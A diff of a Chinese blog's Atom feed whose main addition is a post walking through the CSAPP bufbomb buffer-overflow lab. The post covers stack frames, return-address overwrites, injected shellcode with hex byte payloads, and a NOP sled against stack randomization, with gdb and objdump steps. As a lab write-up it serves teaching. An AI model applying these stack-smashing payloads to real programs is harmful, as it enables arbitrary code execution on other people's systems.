@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://gaufoo.com/"/>
-  <updated>2017-12-09T10:09:04.462Z</updated>
+  <updated>2017-12-30T06:37:14.730Z</updated>
   <id>http://gaufoo.com/</id>
   
   <author>
@@ -14,6 +14,196 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>利用C语言缺陷进行缓冲区溢出攻击</title>
+    <link href="http://gaufoo.com/2017/12/30/overflow/"/>
+    <id>http://gaufoo.com/2017/12/30/overflow/</id>
+    <published>2017-12-30T06:22:22.000Z</published>
+    <updated>2017-12-30T06:37:14.730Z</updated>
+    
+    <content type="html"><![CDATA[<p>黑客初体验。</p>
+<a id="more"></a>
+<hr>
+<h1 id="栈帧结构"><a href="#栈帧结构" class="headerlink" title="栈帧结构"></a>栈帧结构</h1><p>函数的执行包括代码域和数据域：</p>
+<ul>
+<li>代码域存放代码，但是是固定的，运行之前就已经确定。</li>
+<li>数据域存放临时变量，运行时才开辟出来，采用的是<strong>栈帧结构</strong>。</li>
+</ul>
+<p>所谓栈帧结构，就是用<strong>栈指针(sp, stack pointer)</strong> 和<strong>帧指针(bp, base pointer)</strong> 标识内存头尾，中间部分的内存供函数的代码进行操作。<br><img src="/images/overflow/mmexport1514564834036.jpg" width="30%"></p>
+<hr>
+<p>当代码段执行<code>call &lt;func&gt;</code>，程序将跳转到<code>func</code>函数的代码头，执行<code>func</code>函数的代码，并让它自行开辟栈帧。<br><img src="/images/overflow/mmexport1514564847370.jpg" width="30%"></p>
+<hr>
+<p>当<code>func</code>函数执行完，应该回到调用它的原来的函数代码，以及回到原来函数的栈帧。那么该如何实现呢？</p>
+<ul>
+<li><p>回到原来的栈帧：其中一种假想的思路是，栈指针和帧指针指向的内存分别存放原来的栈指针和帧指针，返回的时候直接替换就行了。<br><img src="/images/overflow/mmexport1514564838433.jpg" width="30%"></p>
+</li>
+<li><p>回到原来的代码：可以在帧指针的上一处内存存放<code>call &lt;func&gt;</code>的下一句代码的地址，这样返回的时候让帧指针帮下忙，就可以轻松回到原来的代码。<br><img src="/images/overflow/mmexport1514564820384.jpg" width="70%"></p>
+</li>
+</ul>
+<hr>
+<p>这样假想的栈帧结构其实已经很像真实的栈帧结构了。<br>为了所谓的追求速度，真正的函数栈帧结构其实是连续的，一串连着一串，像这样：<br><img src="/images/overflow/mmexport1514564829598.jpg" width="30%"><br>与假想的栈帧结构相比：</p>
+<ul>
+<li>不变的是返回地址还是在帧指针之上，帧指针还是指向原来的帧指针。</li>
+<li>不同的是栈指针不再需要存放原来的栈指针，因为返回地址之上就是原来栈指针所指的地方。</li>
+</ul>
+<hr>
+<p>调用函数的经过如下：</p>
+<ol>
+<li><code>push pc</code> # 返回地址入栈。</li>
+<li><code>push bp</code> # 原来的帧指针入栈。</li>
+<li><code>mov sp,bp</code> # 让帧指针指向原来的帧指针。</li>
+<li><code>sub sp,#(栈帧大小)</code> # 让栈指针往下开辟一个新的栈帧。</li>
+</ol>
+<p><img src="/images/overflow/mmexport1514564825156.jpg" alt="mmexport1514564825156"></p>
+<p>类似的，返回原来函数的经过如下：</p>
+<ol>
+<li><code>mov bp,sp</code> # 栈指针指向帧指针指向的内存。</li>
+<li><code>pop bp</code> # 帧指针指向原来帧指针指向的内存。</li>
+<li><code>pop pc</code> # 回到原来函数的代码</li>
+</ol>
+<p><img src="/images/overflow/mmexport1514564842593.jpg" alt="mmexport1514564842593"></p>
+<hr>
+<h1 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a>缓冲区溢出攻击</h1><p>可以想象，如果有办法修改栈帧上的返回地址，无疑可以让程序转向任何我们想转向的地方。但是一般不具备这样的机会，因为变量都是有固定大小的，很难突破变量大小的限制，修改变量以外的内存。<br>偏偏C语言对速度的变态追求和对程序员的信任，给了我们这样的机会：它几乎从不进行边界检查，数组可以越界，<code>gets</code>可以越界，而且越界以后只要不影响程序的运行，连崩溃都不会发生。<br>假如一个函数调用了<code>gets</code>向局部变量写入字符串，我们就可以写入比局部变量所规定大小还要大的字符串，业内称作<strong>注入字符串</strong>，来覆盖掉栈帧上的信息，从而达到修改内存的目的。</p>
+<hr>
+<h2 id="破坏型注入"><a href="#破坏型注入" class="headerlink" title="破坏型注入"></a>破坏型注入</h2><p>只粗暴地覆盖返回地址。当函数返回时，代码会跳到被覆盖的返回地址，但是栈帧已经乱套了。<br>不过只要跳到的代码不会用到栈帧，而且能很快就结束程序，那么这种溢出攻击无疑是最简单直接的选择。</p>
+<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>《CSAPP》上提供的实验，需要我们将程序跳到一个名叫<code>smoke</code>的函数。</p>
+<p>步骤如下：</p>
+<ol>
+<li>反汇编程序得到汇编代码。</li>
+<li>查看调用<code>gets</code>的函数的汇编代码，推测需要覆盖多少字节。</li>
+<li>查看<code>smoke</code>函数的代码地址。</li>
+<li>编写注入的16进制机器码。</li>
+<li>实行覆盖。</li>
+</ol>
+<hr>
+<ul>
+<li>反汇编：  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> objdump -d ./bufbomb &gt; disas.txt</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>查看调用<code>gets</code>的函数：<br>  <img src="/images/overflow/0.png"><br>  将<code>%ebp-0x28</code>赋给<code>%eax</code>令人瞩目，这就是字符串首地址。因此覆盖的字符串应当包含：4位返回地址 + 4位bp + 40(0x28的十进制)位字符。</p>
+</li>
+<li><p><code>smoke</code>函数首地址：<br>  <img src="/images/overflow/1.png"><br>  得到<code>smoke</code>函数首地址：<code>0x08048c18</code></p>
+</li>
+<li><p>编写注入的16进制机器码</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00 /* 原字符串大小 */</div><div class="line">00 00 00 00 /* 现bp所指位置，原bp所在位置 */</div><div class="line">18 8c 04 08 /* 覆盖的返回地址 */</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>转成ASCII字符串，此处省略</p>
+</li>
+<li><p>注入，查看结果<br>  <img src="/images/overflow/3.png"><br>  成功</p>
+</li>
+</ul>
+<hr>
+<h2 id="擦屁股型注入"><a href="#擦屁股型注入" class="headerlink" title="擦屁股型注入"></a>擦屁股型注入</h2><p>与破坏型注入相对的是：擦屁股型注入。大意是能让程序正确地返回到原来的函数，并且恢复原来的栈帧。这种注入的要求更高，但是能做到的东西更多，更神不知鬼不觉。<br>这里要讲到汇编语言的一个缺陷：可以允许pc跳到栈段，并把里面的数据当代码执行。因此，只要把注入代码伪装成字符串，让覆盖的返回地址指向注入代码头，就可以让程序执行注入代码。再配合上擦屁股，就可以让作案现场毫无破绽。<br>这就是我花这么大的篇幅去讲解栈帧结构的原因：只要真正理解了栈帧结构，恢复它简直易如反掌。</p>
+<p>要点如下：</p>
+<ol>
+<li>覆盖返回地址时，会覆盖bp所指向的原bp，只要保证它不变，bp就能顺利回到原bp。</li>
+<li>跳到注入代码后，sp已经指向原sp了，所以只要在注入代码的最后，把原返回地址push进栈再ret，就和原来的代码如出一辙。</li>
+</ol>
+<h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><p>《CSAPP》上提供的实验，需要我们修改向原函数返回的值。<br>要修改返回值，就要修改寄存器，可寄存器不如内存那么好处理，不能直接覆盖，只能通过注入代码的方式修改。而且要想成功返回，就得做好擦屁股的工作。</p>
+<p>步骤如下：</p>
+<ol>
+<li>查看反汇编代码，记录正确的返回地址。</li>
+<li>用<code>gdb</code>调试程序，记录原bp和字符串首地址。</li>
+<li>编写注入的汇编代码，并利用<code>gcc</code>，<code>objdump</code>工具将其翻译成机器码。</li>
+<li>编写注入的16进制机器码。</li>
+<li>实行覆盖。</li>
+</ol>
+<hr>
+<ul>
+<li><p>查看反汇编代码：<br>  <img src="/images/overflow/2.png"><br>  得到返回地址：<code>0x08048dbe</code></p>
+</li>
+<li><p>用<code>gdb</code>查看原bp：</p>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> gdb ./bufbomb</span></div><div class="line">  </div><div class="line">(gdb) b getbuf</div><div class="line">(gdb) run -u gaufoo</div><div class="line">(gdb) p /x *(int *)$ebp</div></pre></td></tr></table></figure>
+<p>  <img src="/images/overflow/5.png"></p>
+<p>  得到原bp：<code>0x55683d20</code></p>
+</li>
+<li><p>用<code>gdb</code>查看字符串首地址，就把代码注入到那：</p>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> gdb ./bufbomb</span></div><div class="line">  </div><div class="line">(gdb) b getbuf</div><div class="line">(gdb) run -u gaufoo</div><div class="line">(gdb) p /x ($ebp-0x28)</div></pre></td></tr></table></figure>
+<p>  <img src="/images/overflow/7.png"></p>
+<p>  得到字符串首地址：<code>0x55683cc8</code></p>
+</li>
+<li><p>编写汇编代码，并译成机器码：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// sc.s</div><div class="line">mov $0x4a3e65c1,%eax</div><div class="line">push $0x08048dbe</div><div class="line">ret</div></pre></td></tr></table></figure>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> gcc -m32 -c sc.s</span></div><div class="line"><span class="meta">$</span><span class="bash"> objdump -d sc.o</span></div></pre></td></tr></table></figure>
+<p>  <img src="/images/overflow/6.png"></p>
+</li>
+<li><p>编写注入的16进制机器码：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">b8 c1 65 3e 4a  /* mov $0x4a3e65c1,%eax */</div><div class="line">68 be 8d 04 08  /* push $0x08048dbe */</div><div class="line">c3              /* ret */</div><div class="line">00 00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00</div><div class="line">00 00 00 00 </div><div class="line">20 3d 68 55     /* 现bp所指位置，原bp所在位置 */</div><div class="line">c8 3c 68 55     /* 字符串首地址 */</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>转成ASCII字符串，此处省略</p>
+</li>
+<li><p>注入，查看结果<br>  <img src="/images/overflow/8.png"><br>  成功</p>
+</li>
+</ul>
+<hr>
+<h2 id="反注入原理与抗反注入方法"><a href="#反注入原理与抗反注入方法" class="headerlink" title="反注入原理与抗反注入方法"></a>反注入原理与抗反注入方法</h2><p>gcc编译器反注入的其中一种措施是<strong>栈随机化</strong>，原理是：每次程序运行时在栈最底部随机插上一段不用的内存，让实际使用的栈地址发生变化。它会导致原bp所在位置和字符串首地址不再是固定值，给代码注入带来一定困难。</p>
+<p>对抗这种反注入的方法也挺简单的：</p>
+<ul>
+<li>原bp可以通过现sp计算得到。</li>
+<li>虽然不再能得到字符串首地址，但可以大概猜到字符串中间的位置，只要把代码放在最后面，前面全部用空语句填充。当代码转到任何一个空语句，最终都能“滑”到我想执行的注入代码。</li>
+</ul>
+<h3 id="实践-2"><a href="#实践-2" class="headerlink" title="实践"></a>实践</h3><p>《CSAPP》上提供的实验，注入5次字符串，每次都需要修改向原函数返回的值，难点在于每次注入时的栈地址都会发生变化，模拟编译器的栈随机化。</p>
+<p>步骤如下：</p>
+<ol>
+<li>查看反汇编代码，记录正确的返回地址。</li>
+<li>查看反汇编代码，记录原bp和原sp的距离。</li>
+<li>用<code>gdb</code>调试程序，查看5次字符串首地址，记录最接近尾部的值，即最大值，作为猜测出来的栈中间地址。</li>
+<li>编写注入的汇编代码，并利用<code>gcc</code>，<code>objdump</code>工具将其翻译成机器码。</li>
+<li>编写注入的16进制机器码。</li>
+<li>实行覆盖。</li>
+</ol>
+<hr>
+<ul>
+<li><p>记录正确的返回地址：<br>  <img src="/images/overflow/9.png"><br>  得到返回地址：<code>0x08048e3a</code></p>
+</li>
+<li><p>记录原bp和原sp的距离<br>  <img src="/images/overflow/9.png"></p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">push %ebp</div><div class="line">push %ebx</div><div class="line">sub $0x24,%esp</div></pre></td></tr></table></figure>
+<p>  由这三句汇编代码可得距离为：0x28 = 0x24 + 0x4(ebx长度)</p>
+</li>
+<li><p>查看5次字符串首地址</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ gdb ./bufbomb</div><div class="line">  </div><div class="line">(gdb) b getbufn</div><div class="line">(gdb) run -n -u gaufoo</div></pre></td></tr></table></figure>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb) disas getbufn</div></pre></td></tr></table></figure>
+<p>  <img src="/images/overflow/10.png"></p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">continue</div></pre></td></tr></table></figure>
+<p>  <img src="/images/overflow/11.png"></p>
+<p>  得到首地址最大值：<code>0x55683b58</code></p>
+</li>
+<li><p>编写注入汇编代码：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x4a3e65c1,%eax</div><div class="line">lea -0x28(%esp),%ebp</div><div class="line">push $0x08048e3a</div><div class="line">ret</div></pre></td></tr></table></figure>
+<p>  <code>gcc</code>+<code>objdump</code>，翻译成机器码：<br>  <img src="/images/overflow/12.png"></p>
+</li>
+<li><p>编写注入机器码：<br>  首先0x208是字符串缓冲区长度，十进制为520。<br>  因此注入的机器码应为：509个字节空指令 + 15个字节注入代码 + 4个字节跳转地址 = 528个字节，<br>  因为要注入5次，所以后面要加上’\0a’，再复制5次。<br>  <img src="/images/overflow/13.png" width="65%"></p>
+</li>
+<li><p>转成ASCII字符串，此处省略</p>
+</li>
+<li><p>注入，查看结果<br>  <img src="/images/overflow/14.png"><br>  成功</p>
+</li>
+</ul>
+<hr>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;黑客初体验。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="汇编" scheme="http://gaufoo.com/categories/%E6%B1%87%E7%BC%96/"/>
+    
+    
+      <category term="C" scheme="http://gaufoo.com/tags/C/"/>
+    
+      <category term="原理" scheme="http://gaufoo.com/tags/%E5%8E%9F%E7%90%86/"/>
+    
+      <category term="汇编" scheme="http://gaufoo.com/tags/%E6%B1%87%E7%BC%96/"/>
+    
+  </entry>
   
   <entry>
     <title>听说C语言也可以“泛型”</title>
@@ -354,11 +544,11 @@
       <category term="C++" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
     
     
+      <category term="C" scheme="http://gaufoo.com/tags/C/"/>
+    
       <category term="编程" scheme="http://gaufoo.com/tags/%E7%BC%96%E7%A8%8B/"/>
     
       <category term="C++" scheme="http://gaufoo.com/tags/C/"/>
-    
-      <category term="C" scheme="http://gaufoo.com/tags/C/"/>
     
   </entry>
   
@@ -1351,15 +1541,15 @@
 </tbody>
 </table>
 <hr>
-<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ls -l</span></div><div class="line">drwxr-xr-x 2 gaufoo gaufoo 4096 11月 6 15:30 Document</div></pre></td></tr></table></figure>
+<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> ls -l</div><div class="line">drwxr-xr-x 2 gaufoo gaufoo 4096 11月 6 15:30 Document</div></pre></td></tr></table></figure>
 <ul>
 <li>文件类型<br> <code>d</code>：目录<br> <code>l</code>：软链接<br> <code>b</code>：块设备<br> <code>c</code>：字符设备<br> <code>s</code>：socket<br> <code>p</code>：管道<br> <code>-</code>：普通文件</li>
 <li>文件权限<br> <code>r</code>：读<br> <code>w</code>：写<br> <code>x</code>：执行 </li>
 </ul>
-<h3 id="变更文件所有者"><a href="#变更文件所有者" class="headerlink" title="变更文件所有者"></a>变更文件所有者</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo chown ??? ???</span></div></pre></td></tr></table></figure>
-<h3 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> chmod 700 ???</span></div></pre></td></tr></table></figure>
-<h2 id="文件基本操作"><a href="#文件基本操作" class="headerlink" title="文件基本操作"></a>文件基本操作</h2><h3 id="复制目录"><a href="#复制目录" class="headerlink" title="复制目录"></a>复制目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cp -r ??? ???</span></div></pre></td></tr></table></figure>
-<h3 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> rm -r ???</span></div></pre></td></tr></table></figure>
+<h3 id="变更文件所有者"><a href="#变更文件所有者" class="headerlink" title="变更文件所有者"></a>变更文件所有者</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> sudo chown ??? ???</div></pre></td></tr></table></figure>
+<h3 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> chmod 700 ???</div></pre></td></tr></table></figure>
+<h2 id="文件基本操作"><a href="#文件基本操作" class="headerlink" title="文件基本操作"></a>文件基本操作</h2><h3 id="复制目录"><a href="#复制目录" class="headerlink" title="复制目录"></a>复制目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> cp -r ??? ???</div></pre></td></tr></table></figure>
+<h3 id="删除目录"><a href="#删除目录" class="headerlink" title="删除目录"></a>删除目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span> rm -r ???</div></pre></td></tr></table></figure>
 <hr>
 ]]></content>
     
@@ -2041,60 +2231,6 @@
       <category term="Python" scheme="http://gaufoo.com/tags/Python/"/>
     
       <category term="web" scheme="http://gaufoo.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>C的表达式、语句与副作用</title>
-    <link href="http://gaufoo.com/2017/08/30/C%E7%9A%84%E8%A1%A8%E8%BE%BE%E5%BC%8F%E3%80%81%E8%AF%AD%E5%8F%A5%E4%B8%8E%E5%89%AF%E4%BD%9C%E7%94%A8/"/>
-    <id>http://gaufoo.com/2017/08/30/C的表达式、语句与副作用/</id>
-    <published>2017-08-30T11:17:05.000Z</published>
-    <updated>2017-09-16T07:48:48.363Z</updated>
-    
-    <content type="html"><![CDATA[<p>C语言中，通常利用副作用来完成我们的目标。但由于副作用产生的时机，其结果有时会让人疑惑。</p>
-<a id="more"></a>
-<hr>
-<p>知乎上有这样一个<a href="https://www.zhihu.com/question/64370774/answer/219591438" target="_blank" rel="external">问题</a>:</p>
-<blockquote>
-<p><strong>C语言中 *p++ = *p 是如何工作的？</strong><br>我在测试一个运算符优先级的代码的时候，碰见了这个问题，我没法用自己的方式理解，很抱歉打扰各位，希望你们在闲暇之余，能解答一下我的困惑。</p>
-<p>示例代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LEN 5</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="built_in">printf</span> (<span class="string">"Hello World"</span>);</div><div class="line">	<span class="keyword">int</span> a[LEN] = &#123; <span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span> &#125;;</div><div class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">	<span class="keyword">int</span> *p = a;</div><div class="line"> </div><div class="line">	<span class="keyword">for</span> (; i &lt; LEN; ++i)</div><div class="line">	&#123;</div><div class="line">		*p++ = *p;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; LEN; ++i)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-</blockquote>
-<p>问题的解答需要了解这些概念：</p>
-<hr>
-<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="顺序点"><a href="#顺序点" class="headerlink" title="顺序点"></a>顺序点</h3><blockquote>
-<p>A sequence point is a point in program execution at which all side effects are evaluated before going on to the next step. In C, the semicolon in a statement marks a sequence point. That means all changes made by assignment operators, increment operators, and decrement operators in a statement must take place before a program proceeds to the next statement. Some operators that we’ll discuss in later chapters have sequence points. Also, the end of any full expression is a sequence point.</p>
-</blockquote>
-<p>在顺序点处，所有的副作用都在进入下一步前被计算。也就是说，一句语句中的赋值、自增、自减所作出的改变必须在程序进入下一个语句前发生。在C中，语句里的<strong>分号</strong>标志了一个顺序点。任何一个<strong>完整的表达式</strong>的结束也是一个顺序点。另，<code>while(x++ &lt; 10 &amp;&amp; x + y &lt; 20)</code>里的<code>&amp;&amp;</code>也是顺序点。<br>但是，顺序点前的语句包含的改变，并<strong>没有保证</strong>在哪个表达式执行后发生。其结果取决于编译器的处理。</p>
-<h3 id="完整的表达式"><a href="#完整的表达式" class="headerlink" title="完整的表达式"></a>完整的表达式</h3><blockquote>
-<p>What’s a full expression? A full expression is one that’s not a subexpression of a larger expression. Examples of full expressions include the expression in an expression statement and the expression serving as a test condition for a while loop.</p>
-</blockquote>
-<p>完整的表达式不应该是更大的表达式中的子表达式。而是那些在表达式<strong>语句</strong>里的、以及在一个<code>while</code>循环里作为<strong>判断条件</strong>的表达式。</p>
-<hr>
-<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>考虑：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">x = <span class="number">0</span>;</div><div class="line">y = (<span class="number">4</span> + x++) + (<span class="number">6</span> + x++);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"x = %d y = %d\n"</span>, x, y);</div></pre></td></tr></table></figure></p>
-<p>C只能保证下一条语句前<code>x</code>自增了两次，却没有保证<code>x</code>是某个子表达式被计算后增加还是整个表达式被求值后增加。</p>
-<ul>
-<li>第一种情况，x在整个表达式被求值后才自增：x = 2 y = 10</li>
-<li>第二种情况，(4 + x++)先求值，且x在被求值后自增，再求值(6 + x++)：x = 2 y = 11</li>
-<li>第三种情况，(6 + x++)先求值，且x在被求值后自增，再求值(4 + x++)：x = 2 y = 11</li>
-</ul>
-<hr>
-<h2 id="题目的解答"><a href="#题目的解答" class="headerlink" title="题目的解答"></a>题目的解答</h2><blockquote><code>*p++=*p;</code><br>这一句话一共包含了四个操作：<br>1. <code>*p</code> // 等号左边那个<br>2. <code>p++</code><br>3. <code>*p</code><br>4. <code>=</code><br>这些操作的所有依赖关系如下：<br><li> 1(<code>*p</code>)在2(<code>p++</code>)之前执行<br></li><li> 4(<code>=</code>)在1(<code>*p</code>)和3(<code>*p</code>)之后执行<br>有了这个约束，那么这四个操作的所有可能的顺序就有（人肉枚举有可能出错你自己检查）：<br></li><li> 1234<br></li><li> 1324<br></li><li> 1342<br></li><li> 3124<br></li><li> 3142<br><br>分别的意思就是<br></li><li> p[0]=p[1];p++;<br></li><li> p[0]=p[0];p++;<br></li><li> p[0]=p[0];p++;<br></li><li> p[0]=p[0];p++;<br></li><li> p[0]=p[0];p++;<br><br>作者：vczh<br>链接：<a href="https://www.zhihu.com/question/64370774/answer/219580436" target="_blank" rel="external">https://www.zhihu.com/question/64370774/answer/219580436</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br></li></blockquote>
-
-<hr>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;C语言中，通常利用副作用来完成我们的目标。但由于副作用产生的时机，其结果有时会让人疑惑。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
-    
-      <category term="C" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
-    
-    
-      <category term="C" scheme="http://gaufoo.com/tags/C/"/>
     
   </entry>
   
